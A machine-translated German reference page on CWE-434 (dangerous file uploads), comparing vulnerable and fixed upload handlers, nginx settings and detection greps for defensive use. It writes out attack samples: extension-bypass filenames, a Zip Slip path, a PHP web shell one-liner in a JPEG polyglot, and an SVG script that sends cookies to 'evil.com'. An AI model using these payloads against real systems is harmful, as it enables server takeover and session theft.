---
description: "CWE-434: Nicht eingeschränkter Upload gefährlicher Dateitypen - hochgeladene Dateien werden auf dem Server ausgeführt. Umgehung der Dateiendung, MIME-Verwechslung, SVG-XSS, Polyglotte, Pfadtraversierung im Dateinamen."
date: 2026-04-16
tags: [security, cwe, file-upload, rce, web, xss, path-traversal]
level: Advanced
source_sha256: 602eda7c62a27879e9e91e278404d80a40e1172364a82782aef2fbfbc5fa8210
translation: machine
translated_at: '2026-10-24'
---
# CWE-434: Nicht eingeschränkter Upload gefährlicher Dateitypen {#cwe-434-unrestricted-upload-of-dangerous-file-type}

**CWE Top 25 Rang:** 10 (2024).
**Auswirkungsbereich:** RCE (Upload einer PHP/JSP-Shell), Stored XSS (Upload von SVG/HTML), Pfadtraversierung (Überschreiben von Konfigurationsdateien), DoS (Upload von ZIP-Bomben, Skripten mit Endlosschleifen).
**Kernproblem:** Der Server akzeptiert und speichert Dateien, die der Server oder Clients anschließend in einem privilegierten Kontext ausführen oder rendern.

---

## Funktionale Semantik {#functional-semantics}

Die Schwachstelle tritt in zwei unterschiedlichen Ausführungskontexten auf:

1. **Serverseitige Ausführung:** Die hochgeladene Datei wird in einem Verzeichnis abgelegt, das von einer Anwendungslaufzeit (PHP, Python, Node.js, JSP/Servlet) ausgeliefert wird. Der Angreifer kann die Datei abrufen und den Server veranlassen, sie auszuführen.
2. **Clientseitige Ausführung:** Die hochgeladene Datei wird anderen Benutzern mit einem MIME-Typ ausgeliefert, durch den der Browser sie ausführt (SVG mit eingebettetem JS, HTML-Dateien, XML mit XSLT).

Sekundäre Auswirkungen ohne Ausführung: **Pfadtraversierung im Dateinamen** ermöglicht das Überschreiben beliebiger Dateien auf dem Server; **ZIP-/Archiv-Bomben** führen zur Erschöpfung von Ressourcen.

---

## Techniken zur Umgehung der Dateiendung {#extension-bypass-techniques}

### Doppelte Dateiendung {#double-extension}

```text
shell.php.jpg    # Apache with misconfigured AddHandler will execute as PHP
shell.php%00.jpg # Null byte truncation in older PHP: stored as shell.php
shell.pHp        # Case-insensitive file system + case-insensitive extension check
shell.php5       # Alternative PHP extension not in blocklist
shell.phtml      # Another PHP alternative extension
shell.shtml      # Apache SSI - Server Side Includes execution
```

**Unvollständige Blocklisten (häufige Fehler):**

```python
# VULNERABLE: blocklist approach, incomplete
BLOCKED_EXTENSIONS = {'.php', '.asp', '.aspx', '.py', '.rb'}

def validate_upload(filename):
    ext = os.path.splitext(filename)[1].lower()
    if ext in BLOCKED_EXTENSIONS:
        raise ValueError("Dangerous file type")
    # Misses: .php5, .phtml, .shtml, .cgi, .pl, .jsp, .jspx, .cfm, etc.
```

```python
# FIXED: allowlist approach - only permit explicitly safe types
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf', '.mp4'}

def validate_upload(filename):
    # Use pathlib to handle complex extension cases
    ext = pathlib.Path(filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File type not permitted: {ext}")
```

### Null-Byte-Injection (PHP-Altsysteme/ältere Systeme) {#null-byte-injection-legacy-phpolder-systems}

```text
# HTTP multipart body:
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

# PHP < 5.3.4: null byte truncates the string → stored as shell.php
# Modern PHP: fixed, but may exist in custom C extensions
```

### Pfadtraversierung bei der Archiv-Extraktion (Zip Slip) {#archive-extraction-path-traversal-zip-slip}

```python
# VULNERABLE: extracting ZIP without path validation
import zipfile

def extract_upload(zip_path, dest_dir):
    with zipfile.ZipFile(zip_path) as zf:
        zf.extractall(dest_dir)   # archive may contain ../../etc/cron.d/evil
```

```python
# FIXED: validate each member path stays within dest_dir
import zipfile, pathlib

def safe_extract(zip_path, dest_dir):
    dest = pathlib.Path(dest_dir).resolve()
    with zipfile.ZipFile(zip_path) as zf:
        for member in zf.namelist():
            member_path = (dest / member).resolve()
            if not str(member_path).startswith(str(dest)):
                raise ValueError(f"Path traversal attempt: {member}")
            zf.extract(member, dest_dir)
```

---

## MIME-Typ-Verwechslung {#mime-type-confusion}

### Vom Client gelieferter Content-Type (niemals vertrauen) {#client-supplied-content-type-never-trust}

```python
# VULNERABLE: trusting browser-provided Content-Type
def handle_upload(request):
    content_type = request.FILES['file'].content_type   # from HTTP header, attacker-controlled
    if content_type.startswith('image/'):
        save_file(request.FILES['file'])   # attacker sends PHP shell with Content-Type: image/jpeg
```

```python
# FIXED: detect MIME from file content (magic bytes), not headers
import magic   # python-magic library

def handle_upload(request):
    uploaded = request.FILES['file']
    file_bytes = uploaded.read(2048)
    uploaded.seek(0)

    detected_mime = magic.from_buffer(file_bytes, mime=True)
    if detected_mime not in ALLOWED_MIME_TYPES:
        raise ValueError(f"Detected type {detected_mime} not allowed")
    save_file(uploaded)
```

**Magic Bytes gängiger Typen:**

| Typ | Erste Bytes |
|-----|-------------|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` (`GIF8`) |
| PDF | `25 50 44 46` (`%PDF`) |
| ZIP | `50 4B 03 04` |
| PHP | `3C 3F 70 68` (`<?ph`) - bei Bild-Uploads diese Magic immer ablehnen |

---

## SVG mit eingebettetem JavaScript (Stored XSS) {#svg-with-embedded-javascript-stored-xss}

SVG ist XML und kann `<script>`-Tags enthalten. Wird es als `image/svg+xml` ausgeliefert, führen Browser das JavaScript im Ursprungskontext (Origin) der Seite aus.

```svg
<!-- ATTACK: uploaded as avatar.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Executes in the origin of the site serving this SVG
    document.cookie  // accessible
    fetch('https://evil.com/steal?c=' + document.cookie)
  </script>
  <rect width="100" height="100"/>
</svg>
```

**Lösungsoptionen:**

```python
# Option 1: reject SVG entirely if user-generated content
ALLOWED_IMAGE_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}
# image/svg+xml NOT in this set

# Option 2: if SVG needed, sanitize with bleach/DOMPurify on the server
import bleach

def sanitize_svg(svg_content: str) -> str:
    # Allow structural SVG tags, disallow script/foreignObject/use href tricks
    allowed_tags = {'svg', 'path', 'circle', 'rect', 'line', 'g', 'text', 'defs'}
    allowed_attrs = {'viewBox', 'width', 'height', 'd', 'fill', 'stroke', 'cx', 'cy', 'r'}
    return bleach.clean(svg_content, tags=allowed_tags, attributes=allowed_attrs, strip=True)

# Option 3: serve SVG with Content-Disposition: attachment (no execution in browser)
# and Content-Type: application/octet-stream
```

---

## Polyglotte Dateien {#polyglot-files}

Eine Datei, die gleichzeitig in zwei Formaten gültig ist. Beispiel: ein gültiges JPEG, das zugleich ein gültiges PHP-Skript ist.

```text
# JPEG header
FF D8 FF E0  ...  [valid JPEG data]

# After JPEG data, PHP code appended (JPEG parser ignores trailing data)
<?php system($_GET['cmd']); ?>
```

Das JPEG wird im Bildbetrachter korrekt dargestellt. Wird es über PHP mit bestimmten `eval`-Mustern ausgeliefert oder per `include` eingebunden, führt der PHP-Interpreter es aus.

**Verteidigung:** Neuberechnung der Bilder (alle hochgeladenen Bilder neu kodieren):

```python
from PIL import Image
import io

def sanitize_image_upload(file_bytes: bytes) -> bytes:
    """Re-encode image to strip appended code and EXIF payloads."""
    img = Image.open(io.BytesIO(file_bytes))
    img.verify()  # raises if not valid image

    # Re-open (verify() leaves the file at end of stream)
    img = Image.open(io.BytesIO(file_bytes))
    output = io.BytesIO()
    # Re-encode: strips EXIF, appended PHP, embedded JS in metadata
    img.save(output, format=img.format or 'JPEG', exif=b'')
    return output.getvalue()
```

---

## Pfadtraversierung im Dateinamen {#path-traversal-in-filename}

```python
# VULNERABLE: using user-supplied filename directly
def save_upload(filename, data):
    path = os.path.join('/var/uploads', filename)
    # filename = '../../etc/cron.d/evil' → writes to /etc/cron.d/evil
    with open(path, 'wb') as f:
        f.write(data)
```

```python
# FIXED: use only the basename, generate server-side name
import uuid, pathlib

def save_upload(filename: str, data: bytes) -> str:
    # Extract only the base filename, discard any directory components
    safe_name = pathlib.Path(filename).name   # strips ../../ prefixes
    ext = pathlib.Path(safe_name).suffix.lower()

    # Better: generate a new UUID-based name entirely (avoids name conflicts + traversal)
    stored_name = f"{uuid.uuid4()}{ext}"
    dest = pathlib.Path('/var/uploads') / stored_name

    # Paranoid check: verify final path is within uploads dir
    if not str(dest.resolve()).startswith('/var/uploads'):
        raise ValueError("Path traversal detected")

    dest.write_bytes(data)
    return stored_name
```

---

## Upload in das Webroot / Ausführungskontext {#upload-to-webroot-execution-context}

Eine Datei, die als Download unbedenklich wäre, wird gefährlich, sobald sie in einem Verzeichnis liegt, das von der Anwendungslaufzeit ausgeliefert wird.

```nginx
# VULNERABLE nginx + php-fpm config
location /uploads/ {
    # Files served from here
}
location ~ \.php$ {
    fastcgi_pass php-fpm;
    # If upload dir overlaps with PHP-served dir, uploaded .php files execute
}
```

```nginx
# FIXED: explicitly disable execution in uploads directory
location /uploads/ {
    add_header Content-Disposition "attachment";
    location ~ \.(php|phtml|php5|shtml|cgi|pl|jsp)$ {
        deny all;   # block execution even if misconfigured
    }
}
```

**Grundsatz:** Hochgeladene Dateien dürfen niemals innerhalb oder unterhalb des Code-/Template-Verzeichnisses der Anwendung gespeichert werden. Auslieferung von einem separaten Ursprung (`static.example.com`) oder aus Objektspeicher (S3, GCS) ohne Ausführungsmöglichkeit.

---

## Betroffene Ökosysteme {#affected-ecosystems}

| Ökosystem | Spezifische Risiken | Hinweise |
|-----------|---------------------|----------|
| PHP | Ausführung von `.php`, `.phtml`, `.php5` | Am kritischsten; PHP-`include` aus einem Dateipfad ist RCE |
| Python/Django | Indirekt (keine direkte Dateiausführung); SVG-XSS | Statische Dateien werden anders ausgeliefert; Django führt Uploads nicht aus |
| Java/JSP | Ausführung von `.jsp`, `.jspx`, wenn im Webapp-Root | Upload nach `WEB-INF/` kann umgangen werden; Upload außerhalb des Webroots ist sicher |
| Node.js | Standardmäßig keine Dateiausführung von der Festplatte; `require()`-Injection möglich | SVG-XSS über `res.sendFile` mit falschem Content-Type |
| Ruby on Rails | Fehlkonfigurationen bei CarrierWave/Paperclip; SVG-XSS | Content-Type aus der Dateiendung abgeleitet: auf `.svg` prüfen |
| ASP.NET | Ausführung von `.aspx`, `.ashx`, wenn im IIS-Verzeichnis | IIS liefert `.aspx` aus jedem Ort im Webroot aus |
| Go | Keine eingebaute Dateiausführung; SVG-XSS über `http.ServeFile` | Eigene Ausführung über `os/exec` mit hochgeladenem Dateinamen möglich |

---

## Erkennungsheuristiken {#detection-heuristics}

1. Upload-Handler finden: nach `multipart/form-data`, `request.FILES`, `UploadedFile`, `MultipartFile`, `IFormFile`, `upload.single()` suchen.
2. Für jeden Handler prüfen: Gibt es eine Allowlist für Dateiendungen (nicht eine Blocklist)? Erfolgt eine MIME-Validierung über Magic Bytes (nicht über den `Content-Type`-Header)?
3. Prüfen, wo hochgeladene Dateien gespeichert werden: Liegt der Pfad innerhalb des Webroots? Wird das Verzeichnis mit Ausführungsrechten bereitgestellt?
4. Prüfen, ob der gespeicherte Dateiname aus Benutzereingaben stammt: das Feld `filename` in `Content-Disposition`. Jede Pfadkomponente aus Benutzereingaben ohne `basename()` ist Pfadtraversierung.
5. Bei Bild-Uploads: Gibt es eine Neuberechnung der Bilder (Pillow, ImageMagick `convert`)? Ohne Neuberechnung besteht das Risiko von Polyglotten bzw. Payloads in Metadaten.
6. Den ausgelieferten `Content-Type` prüfen: Werden hochgeladene Dateien mit dem korrekten Typ ausgeliefert, oder rät der Server den Typ anhand der Endung?

```bash
# Grep patterns
grep -rn "request.FILES\|multipart\|upload" --include="*.py" -l
grep -rn "\.filename\|getOriginalFilename\|getClientFilename" --include="*.java" -l
grep -rn "req\.file\|multer\|busboy" --include="*.js" -l
grep -rn "IFormFile\|HttpPostedFileBase" --include="*.cs" -l
```

---

## Behebungsmuster {#fixing-patterns}

| Kontrolle | Umsetzung |
|-----------|-----------|
| Allowlist für Dateiendungen | `ALLOWED_EXT = {'.jpg', '.png', '.pdf'}; if ext not in ALLOWED_EXT: reject` |
| MIME aus Magic Bytes | `python-magic`, `file-type` (npm), `net/http.DetectContentType` (Go) |
| Speicherung außerhalb des Webroots | Upload nach `/var/uploads/` (nicht in `/var/www/`) oder in Objektspeicher |
| Separater statischer Ursprung | Benutzer-Uploads von `uploads.example.com` ausliefern - ein anderer Ursprung verhindert Cookie-Diebstahl |
| UUID-Dateinamen | `stored_as = str(uuid4()) + ext` - verhindert Pfadtraversierung und Raten von Namen |
| Neuberechnung von Bildern | `PIL.Image.open() → img.save()` entfernt angehängten Code und EXIF-Daten |
| Content-Disposition-Header | `Content-Disposition: attachment` erzwingt den Download statt des Renderns |
| Virenscan | ClamAV für hochgeladene Dateien - erkennt bekannte Malware, nicht selbstgeschriebene Shells |
| Dateigrößenbegrenzung | Verhindert ZIP-Bomben; `MAX_UPLOAD_SIZE = 10 * 1024 * 1024` |

---

## Hinweise - Indikatoren für Fehlalarme {#gotchas-false-positive-indicators}

- **Upload-Endpunkte nur für Administratoren ohne externen Benutzerzugriff:** geringeres Risikoprofil, aber die Kompromittierung eines Administratorkontos bleibt ausnutzbar; kein risikofreier Befund.
- **Upload in Objektspeicher (S3/GCS) mit `NoExecute`-Richtlinie:** Dateien in S3 können serverseitig nicht ausgeführt werden; SVG-XSS bleibt jedoch möglich, wenn sie direkt aus S3 ausgeliefert werden, ohne `Content-Disposition: attachment`.
- **Validierung von `Content-Type: image/jpeg` über den Header** des Browsers: keine Lösung, da vom Client geliefert. Sie ist nur relevant, wenn die Validierung `magic.from_buffer()` verwendet.
- **`os.path.basename()` mit Windows-Pfaden unter Linux:** `os.path.basename('C:\\..\\evil.php')` gibt unter Linux `C:\\..\\evil.php` zurück (nicht nur den Dateinamen). `pathlib.Path(filename).name` verwenden, das beide Trennzeichen behandelt.
- **Bildbibliotheken, die beschädigte Header tolerieren:** PIL `Image.open()` wirft bei tatsächlich ungültigen Dateien eine Ausnahme, akzeptiert aber viele Polyglotten. Zuverlässig ist das Muster `img.verify()` + erneutes Öffnen + erneutes Speichern.

---

## Siehe auch {#see-also}

- CWE-22: Path Traversal - Pfadtraversierung über die Dateinamenskomponente
- CWE-79: Cross-Site Scripting - Folgeschaden über SVG-/HTML-Upload
- CWE-352: Cross-Site Request Forgery - wird häufig mit Datei-Uploads kombiniert, um den Upload des Opfers zu erzwingen
- CWE-732: Unsichere Berechtigungen - Verzeichnisrechte des Uploads, die Ausführung ermöglichen
- [[web-application-security-fundamentals]] - breiterer Kontext zur Websicherheit
